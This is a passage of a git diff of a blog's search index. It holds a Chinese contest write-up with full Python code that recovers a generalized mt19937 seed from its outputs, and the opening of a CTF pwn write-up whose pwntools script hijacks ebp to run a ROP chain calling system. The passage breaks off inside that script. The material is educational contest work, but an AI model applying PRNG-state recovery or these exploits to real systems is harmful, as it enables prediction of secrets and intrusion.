-    <url>/2022/01/22/mt19937_expand.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="题意简述"><a href="#题意简述" class="headerlink" title="题意简述"></a>题意简述</h1><p>给出mt19937中的10个参数$ N、M、A、U、S、B、T、C、L、F $，并给出<strong>刚刚生成</strong>的前$ N $个伪随机数，求出伪随机数对应的种子seed。</p>
-<span id="more"></span>
-<h1 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h1><h2 id="20pts"><a href="#20pts" class="headerlink" title="20pts"></a>20pts</h2><p>暴力枚举seed即可，代码略。</p>
-<h2 id="100pts"><a href="#100pts" class="headerlink" title="100pts"></a>100pts</h2><p>做法的大致思路是：生成的随机数→<code>twist</code>后的<code>state</code>→<code>twist</code>前可能的<code>state[-1]</code>→求得seed</p>
-<p>我们先考虑标准情况，也就是参数与论文完全一致的时候，这里有一篇<a href="http://blog.tolinchan.xyz/2021/07/27/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95%E7%A0%94%E7%A9%B6/">现成的题解</a>。</p>
-<p>具体原理这里就不阐释了，给的链接和<a href="https://mivik.gitee.io/2020/solution/mivik-newbie-and-chinos-contest-2020-solution-amegura/">Mivik的题解</a>叙述得很清楚。</p>
-<p>然后当$A$的首位不为1时，就不能直接通过<code>tmp</code>的首位判断原来的<code>tmp</code>是不是奇数了。</p>
-<p>原题解中逆向<code>twist</code>的代码如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backtrace</span>(<span class="params">cur</span>):</span></span><br><span class="line">    high = <span class="number">0x80000000</span></span><br><span class="line">    low = <span class="number">0x7fffffff</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span></span><br><span class="line">    state = cur</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">623</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        tmp = state[i]^state[(i+<span class="number">397</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="comment"># recover highest bit</span></span><br><span class="line">        res = tmp&amp;high</span><br><span class="line">        <span class="comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span></span><br><span class="line">        tmp = state[i-<span class="number">1</span>]^state[(i+<span class="number">396</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        res |= (tmp)&amp;low</span><br><span class="line">        state[i] = res    </span><br><span class="line">    <span class="keyword">return</span> state</span><br></pre></td></tr></table></figure>
-<p>这里的问题就出在<code>if tmp &amp; high == high:</code>这个条件判断已经失效，不能据此判定tmp的准确值。</p>
-<p>一个简便的做法是枚举<code>mt[N - 1]</code>的四种可能，然后由于<code>mt[i - 1] ^ mt[i - 1] &gt;&gt; 30</code>可逆，而且因为$F$是奇数，与<code>2 ** 32</code> 必定互质，因此可以通过求$F$的逆元来倒推seed。</p>
-<p>检验这四个seed的方式就是用seed再重新生成几个随机数，与输入比对即可。</p>
-<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_int32</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">0xFFFFFFFF</span> &amp; x)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mt19937</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, seed=<span class="number">0</span></span>):</span><span class="comment"># magic method (run code below automatically when an object is created) </span></span><br><span class="line">        self.mt = [<span class="number">0</span>] * N</span><br><span class="line">        self.mt[<span class="number">0</span>] = seed</span><br><span class="line">        self.mti = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, N):</span><br><span class="line">            self.mt[i] = _int32(F * (self.mt[i - <span class="number">1</span>] ^ self.mt[i - <span class="number">1</span>] &gt;&gt; <span class="number">30</span>) + i)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getstate</span>(<span class="params">self,op=<span class="literal">False</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.mti == <span class="number">0</span> <span class="keyword">and</span> op==<span class="literal">False</span>:</span><br><span class="line">            self.twist()</span><br><span class="line">        y = self.mt[self.mti]</span><br><span class="line">        y = y ^ y &gt;&gt; U</span><br><span class="line">        y = y ^ y &lt;&lt; S &amp; B</span><br><span class="line">        y = y ^ y &lt;&lt; T &amp; C</span><br><span class="line">        y = y ^ y &gt;&gt; L</span><br><span class="line">        self.mti = (self.mti + <span class="number">1</span>) % N</span><br><span class="line">        <span class="keyword">return</span> _int32(y)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twist</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, N):</span><br><span class="line">            y = _int32((self.mt[i] &amp; <span class="number">0x80000000</span>) + (self.mt[(i + <span class="number">1</span>) % N] &amp; <span class="number">0x7fffffff</span>))</span><br><span class="line">            self.mt[i] = (y &gt;&gt; <span class="number">1</span>) ^ self.mt[(i + M) % N]</span><br><span class="line">            <span class="keyword">if</span> y % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                self.mt[i] = self.mt[i] ^ A</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inverse_right</span>(<span class="params">self,res, shift, mask=<span class="number">0xffffffff</span>, bits=<span class="number">32</span></span>):</span></span><br><span class="line">        tmp = res</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = res ^ tmp &gt;&gt; shift &amp; mask</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inverse_left</span>(<span class="params">self,res, shift, mask=<span class="number">0xffffffff</span>, bits=<span class="number">32</span></span>):</span></span><br><span class="line">        tmp = res</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = res ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_number</span>(<span class="params">self,y</span>):</span> <span class="comment"># namely &quot;temper&quot; in Mivik&#x27;s code</span></span><br><span class="line">        y = y ^ y &gt;&gt; U</span><br><span class="line">        y = y ^ y &lt;&lt; S &amp; B</span><br><span class="line">        y = y ^ y &lt;&lt; T &amp; C</span><br><span class="line">        y = y ^ y &gt;&gt; L</span><br><span class="line">        <span class="keyword">return</span> y&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">self,y</span>):</span> <span class="comment"># inverse of extract_number</span></span><br><span class="line">        y = self.inverse_right(y,L)</span><br><span class="line">        y = self.inverse_left(y,T,C)</span><br><span class="line">        y = self.inverse_left(y,S,B)</span><br><span class="line">        y = self.inverse_right(y,U)</span><br><span class="line">        <span class="keyword">return</span> y&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setstate</span>(<span class="params">self,s</span>):</span> <span class="comment"># N generated random numbers -&gt; mt[] after twisting </span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(s)!=N):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;The length of prediction must be N!&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">            self.mt[i]=self.recover(s[i])</span><br><span class="line">        <span class="comment">#self.mt=s</span></span><br><span class="line">        self.mti=<span class="number">0</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">    def predict(self,s): # a method to predict other pseudo random numbers after given N of them (useless in this problem)</span></span><br><span class="line"><span class="string">        self.setstate(s)</span></span><br><span class="line"><span class="string">        self.twist()</span></span><br><span class="line"><span class="string">        return self.getstate(True)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">invtwist</span>(<span class="params">self</span>):</span> <span class="comment"># mt[] after twisting -&gt; 4 possible values of mt[-1] before twisting</span></span><br><span class="line">        high = <span class="number">0x80000000</span></span><br><span class="line">        low = <span class="number">0x7fffffff</span></span><br><span class="line">        mask = A</span><br><span class="line">        opt = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N-<span class="number">1</span>,N-<span class="number">2</span>,-<span class="number">1</span>): <span class="comment"># only process the last number</span></span><br><span class="line">            <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    tmp = self.mt[i]^self.mt[(i+M)%N]</span><br><span class="line">                    <span class="keyword">if</span> s==<span class="number">0</span>: <span class="comment"># two possibilities</span></span><br><span class="line">                        tmp ^= mask</span><br><span class="line">                        tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">                        tmp |= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">                    res = tmp&amp;high</span><br><span class="line">                    tmp = self.mt[i-<span class="number">1</span>]^self.mt[(i+M-<span class="number">1</span>)%N]</span><br><span class="line">                    <span class="keyword">if</span> t==<span class="number">0</span>: <span class="comment"># another two</span></span><br><span class="line">                        tmp ^= mask</span><br><span class="line">                        tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">                        tmp |= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">                    res |= (tmp)&amp;low</span><br><span class="line">                    opt[s * <span class="number">2</span> + t] = res</span><br><span class="line">        <span class="keyword">return</span> opt</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recover_seed</span>(<span class="params">self,last</span>):</span> <span class="comment"># mt[-1] -&gt; mt[0]</span></span><br><span class="line">        n = <span class="number">1</span> &lt;&lt; <span class="number">32</span></span><br><span class="line">        inv = invert(F, n) <span class="comment"># inverse of F mod 2 ^ 32</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            last = ((last - i) * inv) % n</span><br><span class="line">            last = self.inverse_right(last, <span class="number">30</span>)</span><br><span class="line">        <span class="keyword">return</span> last</span><br><span class="line"></span><br><span class="line">N, M, A, U, S, B, T, C, L, F = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">inpt = [<span class="number">0</span>] * N <span class="comment"># align enough space</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (N):</span><br><span class="line">    inpt[i] = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">D = mt19937() </span><br><span class="line">D.setstate(inpt) <span class="comment"># using the input to recover state after twisting</span></span><br><span class="line">op = D.invtwist() <span class="comment"># generate four possibilities of D.mt[-1]</span></span><br><span class="line">seed = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): <span class="comment"># check the seeds one by one</span></span><br><span class="line">    seed[i] = D.recover_seed(op[i]) </span><br><span class="line">    E = mt19937(seed[i])</span><br><span class="line">    E.getstate() <span class="comment"># another psuedo random number generator</span></span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>): <span class="comment"># compare first 10 numbers is totally enough </span></span><br><span class="line">        <span class="keyword">if</span> E.extract_number(E.mt[j]) != inpt[j]:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> flag &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(seed[i])</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p>时间复杂度$ O(N) $。</p>
-]]></content>
-      <categories>
-        <category>OI</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -1438,6 +1412,32 @@
       <tags>
         <tag>linux</tag>
         <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>广义mt19937随机数逆向</title>
+    <url>/2022/01/22/mt19937_expand.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="题意简述"><a href="#题意简述" class="headerlink" title="题意简述"></a>题意简述</h1><p>给出mt19937中的10个参数$ N、M、A、U、S、B、T、C、L、F $，并给出<strong>刚刚生成</strong>的前$ N $个伪随机数，求出伪随机数对应的种子seed。</p>
+<span id="more"></span>
+<h1 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h1><h2 id="20pts"><a href="#20pts" class="headerlink" title="20pts"></a>20pts</h2><p>暴力枚举seed即可，代码略。</p>
+<h2 id="100pts"><a href="#100pts" class="headerlink" title="100pts"></a>100pts</h2><p>做法的大致思路是：生成的随机数→<code>twist</code>后的<code>state</code>→<code>twist</code>前可能的<code>state[-1]</code>→求得seed</p>
+<p>我们先考虑标准情况，也就是参数与论文完全一致的时候，这里有一篇<a href="http://blog.tolinchan.xyz/2021/07/27/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95%E7%A0%94%E7%A9%B6/">现成的题解</a>。</p>
+<p>具体原理这里就不阐释了，给的链接和<a href="https://mivik.gitee.io/2020/solution/mivik-newbie-and-chinos-contest-2020-solution-amegura/">Mivik的题解</a>叙述得很清楚。</p>
+<p>然后当$A$的首位不为1时，就不能直接通过<code>tmp</code>的首位判断原来的<code>tmp</code>是不是奇数了。</p>
+<p>原题解中逆向<code>twist</code>的代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backtrace</span>(<span class="params">cur</span>):</span></span><br><span class="line">    high = <span class="number">0x80000000</span></span><br><span class="line">    low = <span class="number">0x7fffffff</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span></span><br><span class="line">    state = cur</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">623</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        tmp = state[i]^state[(i+<span class="number">397</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="comment"># recover highest bit</span></span><br><span class="line">        res = tmp&amp;high</span><br><span class="line">        <span class="comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span></span><br><span class="line">        tmp = state[i-<span class="number">1</span>]^state[(i+<span class="number">396</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        res |= (tmp)&amp;low</span><br><span class="line">        state[i] = res    </span><br><span class="line">    <span class="keyword">return</span> state</span><br></pre></td></tr></table></figure>
+<p>这里的问题就出在<code>if tmp &amp; high == high:</code>这个条件判断已经失效，不能据此判定tmp的准确值。</p>
+<p>一个简便的做法是枚举<code>mt[N - 1]</code>的四种可能，然后由于<code>mt[i - 1] ^ mt[i - 1] &gt;&gt; 30</code>可逆，而且因为$F$是奇数，与<code>2 ** 32</code> 必定互质，因此可以通过求$F$的逆元来倒推seed。</p>
+<p>检验这四个seed的方式就是用seed再重新生成几个随机数，与输入比对即可。</p>
+<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_int32</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">0xFFFFFFFF</span> &amp; x)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mt19937</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, seed=<span class="number">0</span></span>):</span><span class="comment"># magic method (run code below automatically when an object is created) </span></span><br><span class="line">        self.mt = [<span class="number">0</span>] * N</span><br><span class="line">        self.mt[<span class="number">0</span>] = seed</span><br><span class="line">        self.mti = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, N):</span><br><span class="line">            self.mt[i] = _int32(F * (self.mt[i - <span class="number">1</span>] ^ self.mt[i - <span class="number">1</span>] &gt;&gt; <span class="number">30</span>) + i)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getstate</span>(<span class="params">self,op=<span class="literal">False</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.mti == <span class="number">0</span> <span class="keyword">and</span> op==<span class="literal">False</span>:</span><br><span class="line">            self.twist()</span><br><span class="line">        y = self.mt[self.mti]</span><br><span class="line">        y = y ^ y &gt;&gt; U</span><br><span class="line">        y = y ^ y &lt;&lt; S &amp; B</span><br><span class="line">        y = y ^ y &lt;&lt; T &amp; C</span><br><span class="line">        y = y ^ y &gt;&gt; L</span><br><span class="line">        self.mti = (self.mti + <span class="number">1</span>) % N</span><br><span class="line">        <span class="keyword">return</span> _int32(y)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twist</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, N):</span><br><span class="line">            y = _int32((self.mt[i] &amp; <span class="number">0x80000000</span>) + (self.mt[(i + <span class="number">1</span>) % N] &amp; <span class="number">0x7fffffff</span>))</span><br><span class="line">            self.mt[i] = (y &gt;&gt; <span class="number">1</span>) ^ self.mt[(i + M) % N]</span><br><span class="line">            <span class="keyword">if</span> y % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                self.mt[i] = self.mt[i] ^ A</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inverse_right</span>(<span class="params">self,res, shift, mask=<span class="number">0xffffffff</span>, bits=<span class="number">32</span></span>):</span></span><br><span class="line">        tmp = res</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = res ^ tmp &gt;&gt; shift &amp; mask</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inverse_left</span>(<span class="params">self,res, shift, mask=<span class="number">0xffffffff</span>, bits=<span class="number">32</span></span>):</span></span><br><span class="line">        tmp = res</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = res ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_number</span>(<span class="params">self,y</span>):</span> <span class="comment"># namely &quot;temper&quot; in Mivik&#x27;s code</span></span><br><span class="line">        y = y ^ y &gt;&gt; U</span><br><span class="line">        y = y ^ y &lt;&lt; S &amp; B</span><br><span class="line">        y = y ^ y &lt;&lt; T &amp; C</span><br><span class="line">        y = y ^ y &gt;&gt; L</span><br><span class="line">        <span class="keyword">return</span> y&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">self,y</span>):</span> <span class="comment"># inverse of extract_number</span></span><br><span class="line">        y = self.inverse_right(y,L)</span><br><span class="line">        y = self.inverse_left(y,T,C)</span><br><span class="line">        y = self.inverse_left(y,S,B)</span><br><span class="line">        y = self.inverse_right(y,U)</span><br><span class="line">        <span class="keyword">return</span> y&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setstate</span>(<span class="params">self,s</span>):</span> <span class="comment"># N generated random numbers -&gt; mt[] after twisting </span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(s)!=N):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;The length of prediction must be N!&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">            self.mt[i]=self.recover(s[i])</span><br><span class="line">        <span class="comment">#self.mt=s</span></span><br><span class="line">        self.mti=<span class="number">0</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">    def predict(self,s): # a method to predict other pseudo random numbers after given N of them (useless in this problem)</span></span><br><span class="line"><span class="string">        self.setstate(s)</span></span><br><span class="line"><span class="string">        self.twist()</span></span><br><span class="line"><span class="string">        return self.getstate(True)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">invtwist</span>(<span class="params">self</span>):</span> <span class="comment"># mt[] after twisting -&gt; 4 possible values of mt[-1] before twisting</span></span><br><span class="line">        high = <span class="number">0x80000000</span></span><br><span class="line">        low = <span class="number">0x7fffffff</span></span><br><span class="line">        mask = A</span><br><span class="line">        opt = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N-<span class="number">1</span>,N-<span class="number">2</span>,-<span class="number">1</span>): <span class="comment"># only process the last number</span></span><br><span class="line">            <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    tmp = self.mt[i]^self.mt[(i+M)%N]</span><br><span class="line">                    <span class="keyword">if</span> s==<span class="number">0</span>: <span class="comment"># two possibilities</span></span><br><span class="line">                        tmp ^= mask</span><br><span class="line">                        tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">                        tmp |= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">                    res = tmp&amp;high</span><br><span class="line">                    tmp = self.mt[i-<span class="number">1</span>]^self.mt[(i+M-<span class="number">1</span>)%N]</span><br><span class="line">                    <span class="keyword">if</span> t==<span class="number">0</span>: <span class="comment"># another two</span></span><br><span class="line">                        tmp ^= mask</span><br><span class="line">                        tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">                        tmp |= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">                    res |= (tmp)&amp;low</span><br><span class="line">                    opt[s * <span class="number">2</span> + t] = res</span><br><span class="line">        <span class="keyword">return</span> opt</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recover_seed</span>(<span class="params">self,last</span>):</span> <span class="comment"># mt[-1] -&gt; mt[0]</span></span><br><span class="line">        n = <span class="number">1</span> &lt;&lt; <span class="number">32</span></span><br><span class="line">        inv = invert(F, n) <span class="comment"># inverse of F mod 2 ^ 32</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            last = ((last - i) * inv) % n</span><br><span class="line">            last = self.inverse_right(last, <span class="number">30</span>)</span><br><span class="line">        <span class="keyword">return</span> last</span><br><span class="line"></span><br><span class="line">N, M, A, U, S, B, T, C, L, F = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">inpt = [<span class="number">0</span>] * N <span class="comment"># align enough space</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (N):</span><br><span class="line">    inpt[i] = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">D = mt19937() </span><br><span class="line">D.setstate(inpt) <span class="comment"># using the input to recover state after twisting</span></span><br><span class="line">op = D.invtwist() <span class="comment"># generate four possibilities of D.mt[-1]</span></span><br><span class="line">seed = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): <span class="comment"># check the seeds one by one</span></span><br><span class="line">    seed[i] = D.recover_seed(op[i]) </span><br><span class="line">    E = mt19937(seed[i])</span><br><span class="line">    E.getstate() <span class="comment"># another psuedo random number generator</span></span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>): <span class="comment"># compare first 10 numbers is totally enough </span></span><br><span class="line">        <span class="keyword">if</span> E.extract_number(E.mt[j]) != inpt[j]:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> flag &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(seed[i])</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>时间复杂度$ O(N) $。</p>
+]]></content>
+      <categories>
+        <category>OI</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -2602,6 +2602,16 @@
 <h2 id="ciscn-2019-es-2——hijack-ebp"><a href="#ciscn-2019-es-2——hijack-ebp" class="headerlink" title="ciscn_2019_es_2——hijack ebp"></a>ciscn_2019_es_2——hijack ebp</h2><p>适用于payload长度较短的情况，将rop写在栈中，通过修改ebp的值劫持程序执行流到构造的rop附近，从而执行自己的rop。</p>
 <p>此题read长度限制为<code>sizeof(buf)+8</code>，故不能直接使用之前的<code>retlibc3</code></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hijackebp</span>():</span></span><br><span class="line">   payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">   io.sendafter(<span class="string">&#x27;Welcome, my friend. What\&#x27;s your name?\n&#x27;</span>, payload1) <span class="comment"># !!! send, not sendline !!!</span></span><br><span class="line">   io.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">   ebp = u32(io.recv(<span class="number">4</span>)) <span class="comment"># the value of ebp ([ebp])</span></span><br><span class="line">   s = ebp - <span class="number">0x38</span> <span class="comment"># the offset between [ebp] and your input argument (get this by debugging)</span></span><br><span class="line">   <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">s</span>):</span></span><br><span class="line">   payload2 = (p32(<span class="number">0</span>) + p32(sys_plt) + p32(vul) + p32(s + <span class="number">0x10</span>) + <span 